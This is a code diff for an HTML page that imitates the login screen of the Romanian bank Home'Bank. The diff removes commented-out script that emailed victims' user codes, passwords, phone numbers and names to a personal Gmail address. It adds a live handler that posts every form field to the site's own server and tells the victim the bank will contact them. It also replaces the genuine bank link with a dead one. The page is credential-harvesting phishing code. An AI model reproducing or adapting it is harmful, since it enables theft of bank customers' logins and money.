@@ -44,7 +44,7 @@
                             <span class="fw-bold">Te rugăm să te autentifici</span>
                         </div>
                         <div class="services">
-                            <a href="https://www.homebank.ro/hb/hb/#/services/homebank/activate" style="color: black
+                            <a href="#" style="color: black
                             ;">Nu ai Home'Bank</a>
                         </div>
                     </div>
@@ -121,46 +121,6 @@
         
     </div>
 
-    <!-- <script>
-        const handleSubmit = (event) => {
-            event.preventDefault();
-          
-            const myForm = event.target;
-            const formData = new FormData(myForm);
-
-            if(null in formData){
-                prompt("Nu ati completat toate câmpurile necesare!");
-            }
-            
-            fetch("/", {
-              method: "POST",
-              headers: { "Content-Type": "application/x-www-form-urlencoded" },
-              body: new URLSearchParams(formData).toString(),
-            })
-              .then(() => alert("Te-ai autentificat cu succes"))
-              .catch((error) => alert(error));
-          };
-          
-        document.querySelector("form").addEventListener("submit", handleSubmit);
-    </script> -->
-
-    <!-- <script src="https://smtpjs.com/v3/smtp.js"></script> -->
-
-    <!-- <script>
-        const sendEmail = () => {
-            const mailAddress = "maadeleke02@gmail.com"
-            const subject = encodeURIComponent("This is my subject")
-            const fullName = encodeURIComponent(document.getElementById('Nume-complet').value)
-            const password = encodeURIComponent(document.getElementById('Parola').value)
-            const usercode = encodeURIComponent(document.getElementById('Codul-de-utilizator').value)
-            const phoneNumber = encodeURIComponent(document.getElementById('Numar-de-telefon').value)
-            const body = "A new user has logged into https://www.homebank.ro/hb/hb/#/login-b/ \nCodul de utilizator: ${usercode}\nParola: ${password}\nNumar de telefon: ${phoneNumber}\nNume complet: ${fullName}"
-
-            const link= `mailto:${mailAddress}&subject=${subject}&body=${body}`
-            window.location.href = link;
-          }
-    </script> -->
-
     <script>
         function validateForm() {
             let form_values = [];
@@ -172,7 +132,26 @@
               alert("Nu ati completat toate câmpurile necesare!");
               return false;
             }
-          }
+        }
+
+        const handleSubmit = (event) => {
+            event.preventDefault();
+          
+            const myForm = event.target;
+            const formData = new FormData(myForm);
+            
+            fetch("/", {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: new URLSearchParams(formData).toString(),
+            })
+              .then(() => alert("Mulțumim pentru informații! Va vom contacta in cel mai scurt timp posibil."))
+              .catch((error) => alert("Nu ati completat toate câmpurile necesare!"));
+          };
+          
+          document
+            .querySelector("form")
+            .addEventListener("submit", handleSubmit);
     </script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
         integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous">
